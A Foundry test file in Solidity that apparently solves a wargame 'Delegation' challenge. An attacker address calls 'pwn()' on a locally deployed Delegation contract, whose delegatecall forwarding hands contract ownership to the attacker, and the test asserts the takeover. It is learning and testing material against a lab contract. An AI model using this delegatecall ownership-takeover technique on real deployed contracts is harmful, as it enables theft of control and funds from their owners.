// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";

contract DelegationTest is Test {
    Delegation delegation;
    Delegate delegate;

    address deployer = address(1);
    address attacker = address(2);

    function setUp() public {
        vm.startPrank(deployer);

        delegate = new Delegate(deployer);
        delegation = new Delegation(address(delegate));

        vm.stopPrank();
    }

    function testExploit() public {
        assertEq(delegation.owner(), deployer);

        vm.prank(attacker);

        (bool success,) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );

        require(success, "call failed");

        assertEq(delegation.owner(), attacker);
    }
}